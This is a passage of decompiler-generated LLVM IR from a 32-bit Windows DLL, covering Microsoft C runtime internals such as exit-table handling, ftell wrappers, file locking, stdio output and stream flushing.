  store i32 ptrtoint (i32* @global_var_1003b788 to i32), i32* %stack_var_-8, align 4, !insn.addr !8704
  %2 = call i32 @__SEH_prolog4_GS(i32* nonnull @global_var_1003b788, i32 12), !insn.addr !8705
  %3 = load i8, i8* @global_var_1003e648, align 1, !insn.addr !8706
  %4 = icmp eq i8 %3, 0, !insn.addr !8706
  %5 = icmp eq i1 %4, false, !insn.addr !8707
  br i1 %5, label %dec_label_pc_10014dff, label %dec_label_pc_10014d5d, !insn.addr !8707

dec_label_pc_10014d5d:                            ; preds = %dec_label_pc_10014d42
  store i32 1, i32* @global_var_1003e640, align 4, !insn.addr !8708
  %6 = add i32 %0, -4, !insn.addr !8709
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8709
  store i32 0, i32* %7, align 4, !insn.addr !8709
  br i1 icmp ne (i32 ptrtoint (i32* @global_var_1003e640 to i32), i32 1), label %dec_label_pc_10014dbc.thread, label %dec_label_pc_10014dbc, !insn.addr !8710

dec_label_pc_10014dbc.thread:                     ; preds = %dec_label_pc_10014d5d
  %8 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !8704
  store i32 -2, i32* %7, align 4, !insn.addr !8711
  store i32 %8, i32* %esp.01.reg2mem
  br label %dec_label_pc_10014dda

dec_label_pc_10014dbc:                            ; preds = %dec_label_pc_10014d5d
  store i32 ptrtoint (i32* @global_var_1003e8dc to i32), i32* %stack_var_-12, align 4, !insn.addr !8712
  %9 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !8712
  %10 = call i32 @__execute_onexit_table(), !insn.addr !8713
  %11 = load i32, i32* %stack_var_-12, align 4, !insn.addr !8714
  %12 = add i32 %9, 4, !insn.addr !8714
  store i32 -2, i32* %7, align 4, !insn.addr !8711
  %13 = icmp eq i32 %11, 0, !insn.addr !8715
  %14 = icmp eq i1 %13, false, !insn.addr !8716
  store i32 %12, i32* %esp.01.reg2mem, !insn.addr !8716
  br i1 %14, label %dec_label_pc_10014dda, label %dec_label_pc_10014dc9, !insn.addr !8716

dec_label_pc_10014dc9:                            ; preds = %dec_label_pc_10014dbc
  store i32 ptrtoint (i32* @global_var_1002d2bc to i32), i32* %stack_var_-12, align 4, !insn.addr !8717
  %15 = add i32 %9, -4, !insn.addr !8718
  %16 = inttoptr i32 %15 to i32*, !insn.addr !8718
  store i32 ptrtoint (i32* @global_var_1002d2ac to i32), i32* %16, align 4, !insn.addr !8718
  %17 = call i32 @__initterm(), !insn.addr !8719
  store i32 %12, i32* %esp.01.reg2mem, !insn.addr !8720
  br label %dec_label_pc_10014dda, !insn.addr !8720

dec_label_pc_10014dda:                            ; preds = %dec_label_pc_10014dbc.thread, %dec_label_pc_10014dc9, %dec_label_pc_10014dbc
  %esp.01.reload = load i32, i32* %esp.01.reg2mem
  %18 = add i32 %esp.01.reload, -4, !insn.addr !8721
  %19 = inttoptr i32 %18 to i32*, !insn.addr !8721
  store i32 ptrtoint (i32* @global_var_1002d2c4 to i32), i32* %19, align 4, !insn.addr !8721
  %20 = add i32 %esp.01.reload, -8, !insn.addr !8722
  %21 = inttoptr i32 %20 to i32*, !insn.addr !8722
  store i32 ptrtoint (i32* @global_var_1002d2c0 to i32), i32* %21, align 4, !insn.addr !8722
  %22 = call i32 @__initterm(), !insn.addr !8723
  %23 = add i32 %1, 4, !insn.addr !8724
  %24 = inttoptr i32 %23 to i32*, !insn.addr !8724
  %25 = load i32, i32* %24, align 4, !insn.addr !8724
  %26 = inttoptr i32 %25 to i32*, !insn.addr !8725
  %27 = load i32, i32* %26, align 4, !insn.addr !8725
  %28 = icmp eq i32 %27, 0, !insn.addr !8725
  %29 = icmp eq i1 %28, false, !insn.addr !8726
  br i1 %29, label %dec_label_pc_10014dff, label %dec_label_pc_10014df2, !insn.addr !8726

dec_label_pc_10014df2:                            ; preds = %dec_label_pc_10014dda
  store i8 1, i8* @global_var_1003e648, align 1, !insn.addr !8727
  %30 = add i32 %1, 8, !insn.addr !8728
  %31 = inttoptr i32 %30 to i32*, !insn.addr !8728
  %32 = load i32, i32* %31, align 4, !insn.addr !8728
  %33 = inttoptr i32 %32 to i8*, !insn.addr !8729
  store i8 1, i8* %33, align 1, !insn.addr !8729
  br label %dec_label_pc_10014dff, !insn.addr !8729

dec_label_pc_10014dff:                            ; preds = %dec_label_pc_10014df2, %dec_label_pc_10014dda, %dec_label_pc_10014d42
  %34 = call i32 @__SEH_epilog4_GS(), !insn.addr !8730
  ret i32 %34, !insn.addr !8731
}

define i32 @function_10014e05() local_unnamed_addr {
dec_label_pc_10014e05:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -20, !insn.addr !8732
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8732
  %3 = load i32, i32* %2, align 4, !insn.addr !8732
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8733
  %5 = load i32, i32* %4, align 4, !insn.addr !8733
  %6 = inttoptr i32 %5 to i32*, !insn.addr !8734
  %7 = load i32, i32* %6, align 4, !insn.addr !8734
  %8 = call i32 @function_10014e1e(i32 %7), !insn.addr !8735
  ret i32 %8, !insn.addr !8736
}

define i32 @function_10014e1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014e1e:
  %0 = icmp eq i32 %arg1, -529697949, !insn.addr !8737
  %1 = zext i1 %0 to i32, !insn.addr !8738
  ret i32 %1, !insn.addr !8739
}

declare i32 @"?common_exit@@YAXHW4_crt_exit_cleanup_mode@@W4_crt_exit_return_mode@@@Z"(i32, i32, i32) local_unnamed_addr

define i32 @___acrt_initialize_thread_local_exit_callback(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014f77:
  store i32 %arg1, i32* @global_var_1003e644, align 4, !insn.addr !8740
  ret i32 %arg1, !insn.addr !8741
}

define i32 @__cexit() local_unnamed_addr {
dec_label_pc_10014f86:
  %0 = call i32 @"?common_exit@@YAXHW4_crt_exit_cleanup_mode@@W4_crt_exit_return_mode@@@Z"(i32 0, i32 0, i32 1), !insn.addr !8742
  ret i32 %0, !insn.addr !8743
}

define i32 @__is_c_termination_complete() local_unnamed_addr {
dec_label_pc_10014fab:
  %0 = load i32, i32* @global_var_1003e640, align 4, !insn.addr !8744
  ret i32 %0, !insn.addr !8745
}

declare i32 @"??$common_ftell@J@@YAJV__crt_stdio_stream@@@Z"(i32) local_unnamed_addr

define i32 @function_10015014() local_unnamed_addr {
dec_label_pc_10015014:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 8, !insn.addr !8746
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8746
  %3 = load i32, i32* %2, align 4, !insn.addr !8746
  %4 = call i32 @__lock_file.13(i32 %3), !insn.addr !8747
  ret i32 %4, !insn.addr !8748
}

declare i32 @"??$common_ftell@_J@@YA_JV__crt_stdio_stream@@@Z"(i32) local_unnamed_addr

define i32 @function_10015090() local_unnamed_addr {
dec_label_pc_10015090:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 8, !insn.addr !8749
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8749
  %3 = load i32, i32* %2, align 4, !insn.addr !8749
  %4 = call i32 @__lock_file.13(i32 %3), !insn.addr !8750
  ret i32 %4, !insn.addr !8751
}

declare i32 @"??$common_ftell_nolock@_J@@YA_JV__crt_stdio_stream@@@Z"(i32) local_unnamed_addr

define i32 @__ftelli64() local_unnamed_addr {
dec_label_pc_100155f7:
  %0 = call i32 @"??$common_ftell@_J@@YA_JV__crt_stdio_stream@@@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !8752
  ret i32 %0, !insn.addr !8752
}

define i32 @__ftelli64_nolock() local_unnamed_addr {
dec_label_pc_10015602:
  %0 = call i32 @"??$common_ftell_nolock@_J@@YA_JV__crt_stdio_stream@@@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !8753
  ret i32 %0, !insn.addr !8753
}

define i32 @function_1001560d() local_unnamed_addr {
dec_label_pc_1001560d:
  %0 = call i32 @"??$common_ftell@J@@YAJV__crt_stdio_stream@@@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !8754
  ret i32 %0, !insn.addr !8754
}

define i32 @function_10015618(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10015618:
  %0 = call i32 @__calloc_base(), !insn.addr !8755
  ret i32 %0, !insn.addr !8755
}

declare i32 @_rand() local_unnamed_addr

declare void @_srand(i32) local_unnamed_addr

define i32 @function_10015700() local_unnamed_addr {
dec_label_pc_10015700:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp eq i32 %0, 0, !insn.addr !8756
  %3 = icmp eq i1 %2, false, !insn.addr !8757
  %.pre = add i32 %1, -28
  %.pre1 = inttoptr i32 %.pre to i32*
  br i1 %3, label %dec_label_pc_1001570d, label %dec_label_pc_10015704, !insn.addr !8757

dec_label_pc_10015704:                            ; preds = %dec_label_pc_10015700
  %4 = load i32, i32* %.pre1, align 4, !insn.addr !8758
  %5 = call i32 @"?__acrt_stdio_free_stream@@YAXV__crt_stdio_stream@@@Z"(i32 %4), !insn.addr !8759
  br label %dec_label_pc_1001570d, !insn.addr !8760

dec_label_pc_1001570d:                            ; preds = %dec_label_pc_10015700, %dec_label_pc_10015704
  %6 = load i32, i32* %.pre1, align 4, !insn.addr !8761
  %7 = call i32 @__lock_file.13(i32 %6), !insn.addr !8762
  ret i32 %7, !insn.addr !8763
}

declare %_IO_FILE* @_fopen(i8*, i8*) local_unnamed_addr

declare i32 @_fclose(%_IO_FILE*) local_unnamed_addr

define i32 @function_1001581a() local_unnamed_addr {
dec_label_pc_1001581a:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -32, !insn.addr !8764
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8764
  %3 = load i32, i32* %2, align 4, !insn.addr !8764
  %4 = call i32 @__lock_file.13(i32 %3), !insn.addr !8765
  ret i32 %4, !insn.addr !8766
}

define i32 @function_10015922() local_unnamed_addr {
dec_label_pc_10015922:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 8, !insn.addr !8767
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8767
  %3 = load i32, i32* %2, align 4, !insn.addr !8767
  %4 = call i32 @__lock_file.13(i32 %3), !insn.addr !8768
  ret i32 %4, !insn.addr !8769
}

declare i32 @_fseek(%_IO_FILE*, i32, i32) local_unnamed_addr

declare i32 @_strcspn(i8*, i8*) local_unnamed_addr

define i32 @function_10015b66(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10015b66:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b868, i32 12), !insn.addr !8770
  %2 = add i32 %0, -28, !insn.addr !8771
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8771
  store i32 0, i32* %3, align 4, !insn.addr !8771
  %4 = add i32 %0, 8, !insn.addr !8772
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8772
  %6 = load i32, i32* %5, align 4, !insn.addr !8772
  %7 = inttoptr i32 %6 to i32*, !insn.addr !8773
  %8 = load i32, i32* %7, align 4, !insn.addr !8773
  %9 = call i32 @__lock_file(i32 %8), !insn.addr !8774
  %10 = add i32 %0, -4, !insn.addr !8775
  %11 = inttoptr i32 %10 to i32*, !insn.addr !8775
  store i32 0, i32* %11, align 4, !insn.addr !8775
  %12 = call i32 @function_100162e8(), !insn.addr !8776
  store i32 %12, i32* %3, align 4, !insn.addr !8777
  store i32 -2, i32* %11, align 4, !insn.addr !8778
  %13 = call i32 @function_10015bab(), !insn.addr !8779
  %14 = call i32 @__SEH_epilog4(), !insn.addr !8780
  ret i32 %14, !insn.addr !8781
}

define i32 @function_10015bab() local_unnamed_addr {
dec_label_pc_10015bab:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !8782
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8782
  %3 = load i32, i32* %2, align 4, !insn.addr !8782
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8783
  %5 = load i32, i32* %4, align 4, !insn.addr !8783
  %6 = call i32 @__lock_file.13(i32 %5), !insn.addr !8784
  ret i32 %6, !insn.addr !8785
}

define i32 @"??$__acrt_lock_stream_and_call@V<lambda_df52180bf14694d51fdefd82613e8f07>@@@@YAHQAU_iobuf@@$$QAV<lambda_df52180bf14694d51fdefd82613e8f07>@@@Z"(i32* %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10015bb7:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %2 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %2, i32* %stack_var_-12, align 4, !insn.addr !8786
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !8787
  %3 = call i32 @function_10015b66(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %2, i32 %2, i32 %0), !insn.addr !8788
  ret i32 %3, !insn.addr !8789
}

declare i32 @"??0?$output_adapter_data@DV?$stream_output_adapter@D@__crt_stdio_output@@@__crt_stdio_output@@IAE@ABV?$stream_output_adapter@D@1@_KQBDQAU__crt_locale_pointers@@QAD@Z"(i32*, i64, i8*, i32*, i8*) local_unnamed_addr

declare i32 @"??0_LocaleUpdate@@QAE@QAU__crt_locale_pointers@@@Z"(i32*) local_unnamed_addr

declare i32 @"??1formatting_buffer@__crt_stdio_output@@QAE@XZ"() local_unnamed_addr

define i32 @function_100162e8() local_unnamed_addr {
dec_label_pc_100162e8:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i8 @__decompiler_undefined_function_4()
  %stack_var_-1124 = alloca i32, align 4
  %stack_var_-1120 = alloca i32, align 4
  %stack_var_-1148 = alloca i32, align 4
  %4 = call i32 @___acrt_stdio_begin_temporary_buffering_nolock(i32 %2, i32 %0, i32 %1), !insn.addr !8790
  %5 = call i32 @"??0_LocaleUpdate@@QAE@QAU__crt_locale_pointers@@@Z"(i32* nonnull %stack_var_-1148), !insn.addr !8791
  %6 = ptrtoint i32* %stack_var_-1120 to i32, !insn.addr !8792
  store i32 %6, i32* %stack_var_-1124, align 4, !insn.addr !8793
  %7 = add i32 %2, 12, !insn.addr !8794
  %8 = inttoptr i32 %7 to i32*, !insn.addr !8794
  %9 = load i32, i32* %8, align 4, !insn.addr !8794
  %10 = inttoptr i32 %9 to i32*, !insn.addr !8795
  %11 = load i32, i32* %10, align 4, !insn.addr !8795
  %12 = inttoptr i32 %11 to i8*, !insn.addr !8795
  %13 = add i32 %2, 8, !insn.addr !8796
  %14 = inttoptr i32 %13 to i32*, !insn.addr !8796
  %15 = load i32, i32* %14, align 4, !insn.addr !8796
  %16 = add i32 %15, 4, !insn.addr !8797
  %17 = inttoptr i32 %16 to i32*, !insn.addr !8797
  %18 = load i32, i32* %17, align 4, !insn.addr !8797
  %19 = inttoptr i32 %15 to i32*, !insn.addr !8798
  %20 = load i32, i32* %19, align 4, !insn.addr !8798
  %21 = inttoptr i32 %20 to i8*, !insn.addr !8798
  %22 = ptrtoint i32* %stack_var_-1124 to i32, !insn.addr !8799
  %23 = sext i32 %22 to i64, !insn.addr !8800
  %24 = inttoptr i32 %18 to i32*, !insn.addr !8800
  %25 = call i32 @"??0?$output_adapter_data@DV?$stream_output_adapter@D@__crt_stdio_output@@@__crt_stdio_output@@IAE@ABV?$stream_output_adapter@D@1@_KQBDQAU__crt_locale_pointers@@QAD@Z"(i32* nonnull %stack_var_-1120, i64 %23, i8* %21, i32* %24, i8* %12), !insn.addr !8800
  %26 = call i32 @"?process@?$output_processor@DV?$stream_output_adapter@D@__crt_stdio_output@@V?$standard_base@DV?$stream_output_adapter@D@__crt_stdio_output@@@2@@__crt_stdio_output@@QAEHXZ"(), !insn.addr !8801
  %27 = call i32 @"??1formatting_buffer@__crt_stdio_output@@QAE@XZ"(), !insn.addr !8802
  %28 = icmp eq i8 %3, 0, !insn.addr !8803
  br i1 %28, label %dec_label_pc_10016389, label %dec_label_pc_1001637c, !insn.addr !8804

dec_label_pc_1001637c:                            ; preds = %dec_label_pc_100162e8
  %29 = load i32, i32* %stack_var_-1148, align 4, !insn.addr !8805
  %30 = add i32 %29, 848, !insn.addr !8806
  %31 = inttoptr i32 %30 to i32*, !insn.addr !8806
  %32 = load i32, i32* %31, align 4, !insn.addr !8806
  %33 = and i32 %32, -3, !insn.addr !8806
  store i32 %33, i32* %31, align 4, !insn.addr !8806
  br label %dec_label_pc_10016389, !insn.addr !8806

dec_label_pc_10016389:                            ; preds = %dec_label_pc_1001637c, %dec_label_pc_100162e8
  %34 = trunc i32 %4 to i8, !insn.addr !8807
  %35 = call i32 @___acrt_stdio_end_temporary_buffering_nolock(i8 %34, i32 %2), !insn.addr !8808
  %36 = call i32 @"@__security_check_cookie@4"(), !insn.addr !8809
  ret i32 %36, !insn.addr !8810
}

declare i32 @"?process@?$output_processor@DV?$stream_output_adapter@D@__crt_stdio_output@@V?$standard_base@DV?$stream_output_adapter@D@__crt_stdio_output@@@2@@__crt_stdio_output@@QAEHXZ"() local_unnamed_addr

declare i32 @___stdio_common_vfprintf(i32, i32) local_unnamed_addr

declare i32 @___stdio_common_vsprintf(i32, i32) local_unnamed_addr

declare i32 @___stdio_common_vsprintf_s(i32, i32) local_unnamed_addr

declare %lconv* @_localeconv() local_unnamed_addr

declare void @_free(i32*) local_unnamed_addr

declare double @_frexp(double, i32*) local_unnamed_addr

define i32 @___acrt_initialize_invalid_parameter_handler(i32 %arg1) local_unnamed_addr {
dec_label_pc_10017db6:
  store i32 %arg1, i32* @global_var_1003e650, align 4, !insn.addr !8811
  ret i32 %arg1, !insn.addr !8812
}

declare i32 @__invalid_parameter_noinfo_noreturn() local_unnamed_addr

declare i32 @__invoke_watson(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @"??$common_getenv@D@@YAPADQBD@Z"(i8*) local_unnamed_addr

define i32 @function_10017f17() local_unnamed_addr {
dec_label_pc_10017f17:
  %0 = call i32 @___acrt_unlock(i32 11), !insn.addr !8813
  ret i32 %0, !insn.addr !8814
}

define i32 @function_10017f90(i8* %arg1) local_unnamed_addr {
dec_label_pc_10017f90:
  %0 = call i32 @"??$common_getenv@D@@YAPADQBD@Z"(i8* bitcast (i32* @1 to i8*)), !insn.addr !8815
  ret i32 %0, !insn.addr !8815
}

define i32 @_malloc() local_unnamed_addr {
dec_label_pc_10017f9b:
  %0 = call i32 @__malloc_base(), !insn.addr !8816
  ret i32 %0, !insn.addr !8816
}

declare i32 @_mbstowcs(i16*, i8*, i32) local_unnamed_addr

declare i32 @___acrt_iob_func(i32, i32, i32) local_unnamed_addr

declare i32 @__lock_file(i32) local_unnamed_addr

declare i32 @__lock_file.13(i32) local_unnamed_addr

declare i8* @_strncpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @___acrt_lock(i32) local_unnamed_addr

declare i32 @___acrt_unlock(i32) local_unnamed_addr

define i32 @__lock_locales() local_unnamed_addr {
dec_label_pc_100185a4:
  %0 = call i32 @___acrt_lock(i32 4), !insn.addr !8817
  ret i32 %0, !insn.addr !8818
}

define i32 @__unlock_locales() local_unnamed_addr {
dec_label_pc_100185ad:
  %0 = call i32 @___acrt_unlock(i32 4), !insn.addr !8819
  ret i32 %0, !insn.addr !8820
}

declare i32 @___doserrno() local_unnamed_addr

declare i32* @__errno() local_unnamed_addr

define i32 @function_10018642(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10018642:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b8a8, i32 8), !insn.addr !8821
  %2 = add i32 %0, 8, !insn.addr !8822
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8822
  %4 = load i32, i32* %3, align 4, !insn.addr !8822
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8823
  %6 = load i32, i32* %5, align 4, !insn.addr !8823
  %7 = call i32 @__lock_file(i32 %6), !insn.addr !8824
  %8 = add i32 %0, -4, !insn.addr !8825
  %9 = inttoptr i32 %8 to i32*, !insn.addr !8825
  store i32 0, i32* %9, align 4, !insn.addr !8825
  %10 = add i32 %0, 12, !insn.addr !8826
  %11 = inttoptr i32 %10 to i32*, !insn.addr !8826
  %12 = load i32, i32* %11, align 4, !insn.addr !8826
  %13 = add i32 %12, 4, !insn.addr !8827
  %14 = inttoptr i32 %13 to i32*, !insn.addr !8827
  %15 = load i32, i32* %14, align 4, !insn.addr !8827
  %16 = inttoptr i32 %12 to i32*, !insn.addr !8828
  %17 = load i32, i32* %16, align 4, !insn.addr !8828
  %18 = inttoptr i32 %17 to i32*, !insn.addr !8829
  %19 = load i32, i32* %18, align 4, !insn.addr !8829
  %20 = inttoptr i32 %15 to i32*, !insn.addr !8830
  %21 = call i32 @"?common_flush_all_should_try_to_flush_stream@@YA_NV__crt_stdio_stream@@QAH@Z"(i32 %19, i32* %20), !insn.addr !8830
  %22 = trunc i32 %21 to i8, !insn.addr !8831
  %23 = icmp eq i8 %22, 0, !insn.addr !8831
  br i1 %23, label %dec_label_pc_100186a3, label %dec_label_pc_10018672, !insn.addr !8832

dec_label_pc_10018672:                            ; preds = %dec_label_pc_10018642
  %24 = add i32 %12, 8, !insn.addr !8833
  %25 = inttoptr i32 %24 to i32*, !insn.addr !8833
  %26 = load i32, i32* %25, align 4, !insn.addr !8833
  %27 = inttoptr i32 %26 to i8*, !insn.addr !8834
  %28 = load i8, i8* %27, align 1, !insn.addr !8834
  %29 = icmp eq i8 %28, 0, !insn.addr !8834
  %30 = icmp eq i1 %29, false, !insn.addr !8835
  %.pre = load i32, i32* %16, align 4
  %.phi.trans.insert = inttoptr i32 %.pre to i32*
  %.pre1 = load i32, i32* %.phi.trans.insert, align 4
  br i1 %30, label %dec_label_pc_10018687, label %dec_label_pc_1001867a, !insn.addr !8835

dec_label_pc_1001867a:                            ; preds = %dec_label_pc_10018672
  %31 = add i32 %.pre1, 12, !insn.addr !8836
  %32 = inttoptr i32 %31 to i32*, !insn.addr !8836
  %33 = load i32, i32* %32, align 4, !insn.addr !8836
  %34 = and i32 %33, 2
  %35 = icmp eq i32 %34, 0, !insn.addr !8837
  br i1 %35, label %dec_label_pc_100186a3, label %dec_label_pc_10018687, !insn.addr !8838

dec_label_pc_10018687:                            ; preds = %dec_label_pc_10018672, %dec_label_pc_1001867a
  %36 = call i32 @__fflush_nolock(i32 %.pre1), !insn.addr !8839
  %37 = icmp eq i32 %36, -1, !insn.addr !8840
  br i1 %37, label %dec_label_pc_1001869d, label %dec_label_pc_10018696, !insn.addr !8841

dec_label_pc_10018696:                            ; preds = %dec_label_pc_10018687
  %38 = load i32, i32* %14, align 4, !insn.addr !8842
  %39 = inttoptr i32 %38 to i32*, !insn.addr !8843
  %40 = load i32, i32* %39, align 4, !insn.addr !8843
  %41 = add i32 %40, 1, !insn.addr !8843
  store i32 %41, i32* %39, align 4, !insn.addr !8843
  br label %dec_label_pc_100186a3, !insn.addr !8844

dec_label_pc_1001869d:                            ; preds = %dec_label_pc_10018687
  %42 = add i32 %12, 12, !insn.addr !8845
  %43 = inttoptr i32 %42 to i32*, !insn.addr !8845
  %44 = load i32, i32* %43, align 4, !insn.addr !8845
  %45 = inttoptr i32 %44 to i32*, !insn.addr !8846
  store i32 -1, i32* %45, align 4, !insn.addr !8846
  br label %dec_label_pc_100186a3, !insn.addr !8846

dec_label_pc_100186a3:                            ; preds = %dec_label_pc_1001869d, %dec_label_pc_10018696, %dec_label_pc_1001867a, %dec_label_pc_10018642
  store i32 -2, i32* %9, align 4, !insn.addr !8847
  %46 = call i32 @function_100186b7(), !insn.addr !8848
  %47 = call i32 @__SEH_epilog4(), !insn.addr !8849
  ret i32 %47, !insn.addr !8850
}

define i32 @function_100186b7() local_unnamed_addr {
dec_label_pc_100186b7:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !8851
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8851
  %3 = load i32, i32* %2, align 4, !insn.addr !8851
  %4 = inttoptr i32 %3 to i32*, !insn.addr !8852
  %5 = load i32, i32* %4, align 4, !insn.addr !8852
  %6 = call i32 @__lock_file.13(i32 %5), !insn.addr !8853
  ret i32 %6, !insn.addr !8854
}

define i32 @function_100186c3(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100186c3:
  %edi.1.reg2mem = alloca i32, !insn.addr !8855
  %esi.01.reg2mem = alloca i32, !insn.addr !8855
  %edi.02.reg2mem = alloca i32, !insn.addr !8855
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1003b8c8 to i32), i32* %stack_var_-8, align 4, !insn.addr !8856
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b8c8, i32 32), !insn.addr !8857
  %2 = add i32 %0, 8, !insn.addr !8858
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8858
  %4 = load i32, i32* %3, align 4, !insn.addr !8858
  %5 = inttoptr i32 %4 to i32*, !insn.addr !8859
  %6 = load i32, i32* %5, align 4, !insn.addr !8859
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !8860
  %8 = add i32 %0, -4, !insn.addr !8861
  %9 = inttoptr i32 %8 to i32*, !insn.addr !8861
  store i32 0, i32* %9, align 4, !insn.addr !8861
  %10 = load i32, i32* @global_var_1003e658, align 4, !insn.addr !8862
  %11 = load i32, i32* @global_var_1003e654, align 4, !insn.addr !8863
  %12 = mul i32 %11, 4, !insn.addr !8864
  %13 = add i32 %0, 12, !insn.addr !8865
  %14 = inttoptr i32 %13 to i32*, !insn.addr !8865
  %15 = load i32, i32* %14, align 4, !insn.addr !8865
  %16 = add i32 %0, -32, !insn.addr !8866
  %17 = inttoptr i32 %16 to i32*, !insn.addr !8866
  store i32 %10, i32* %17, align 4, !insn.addr !8866
  %18 = icmp eq i32 %12, 0, !insn.addr !8867
  br i1 %18, label %dec_label_pc_10018736, label %dec_label_pc_100186f6.lr.ph, !insn.addr !8868

dec_label_pc_100186f6.lr.ph:                      ; preds = %dec_label_pc_100186c3
  %19 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !8869
  %20 = add i32 %12, %10, !insn.addr !8864
  %21 = add i32 %0, -28, !insn.addr !8870
  %22 = inttoptr i32 %21 to i32*, !insn.addr !8870
  %23 = add i32 %19, -4, !insn.addr !8871
  %24 = inttoptr i32 %23 to i32*, !insn.addr !8871
  %25 = add i32 %19, -8, !insn.addr !8872
  %26 = inttoptr i32 %25 to i32*, !insn.addr !8872
  %27 = add i32 %0, -48
  %28 = inttoptr i32 %27 to i32*
  %29 = add i32 %0, -44
  %30 = inttoptr i32 %29 to i32*
  %31 = add i32 %0, -40
  %32 = inttoptr i32 %31 to i32*
  %33 = add i32 %0, -36
  %34 = inttoptr i32 %33 to i32*
  store i32 %15, i32* %edi.02.reg2mem
  store i32 %10, i32* %esi.01.reg2mem
  br label %dec_label_pc_100186f6

dec_label_pc_100186f6:                            ; preds = %dec_label_pc_100186f6.lr.ph, %dec_label_pc_10018731
  %esi.01.reload = load i32, i32* %esi.01.reg2mem
  %edi.02.reload = load i32, i32* %edi.02.reg2mem
  %35 = inttoptr i32 %esi.01.reload to i32*, !insn.addr !8873
  %36 = load i32, i32* %35, align 4, !insn.addr !8873
  store i32 %36, i32* %22, align 4, !insn.addr !8870
  %37 = inttoptr i32 %edi.02.reload to i32*, !insn.addr !8871
  %38 = load i32, i32* %37, align 4, !insn.addr !8871
  store i32 %38, i32* %24, align 4, !insn.addr !8871
  store i32 %36, i32* %26, align 4, !insn.addr !8872
  %39 = call i32 @"?common_flush_all_should_try_to_flush_stream@@YA_NV__crt_stdio_stream@@QAH@Z"(i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !8874
  %40 = trunc i32 %39 to i8, !insn.addr !8875
  %41 = icmp eq i8 %40, 0, !insn.addr !8875
  store i32 %edi.02.reload, i32* %edi.1.reg2mem, !insn.addr !8876
  br i1 %41, label %dec_label_pc_10018731, label %dec_label_pc_10018709, !insn.addr !8876

dec_label_pc_10018709:                            ; preds = %dec_label_pc_100186f6
  %42 = add i32 %edi.02.reload, 8, !insn.addr !8877
  %43 = inttoptr i32 %42 to i32*, !insn.addr !8877
  %44 = load i32, i32* %43, align 4, !insn.addr !8877
  %45 = add i32 %edi.02.reload, 4, !insn.addr !8878
  %46 = inttoptr i32 %45 to i32*, !insn.addr !8878
  %47 = load i32, i32* %46, align 4, !insn.addr !8878
  %48 = load i32, i32* %37, align 4, !insn.addr !8879
  store i32 %21, i32* %28, align 4, !insn.addr !8880
  store i32 %48, i32* %30, align 4, !insn.addr !8881
  store i32 %47, i32* %32, align 4, !insn.addr !8882
  store i32 %44, i32* %34, align 4, !insn.addr !8883
  store i32 %27, i32* %24, align 4, !insn.addr !8884
  %49 = load i32, i32* %22, align 4, !insn.addr !8885
  store i32 %49, i32* %26, align 4, !insn.addr !8885
  %50 = call i32 @function_100187d4(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !8886
  %51 = load i32, i32* %14, align 4, !insn.addr !8887
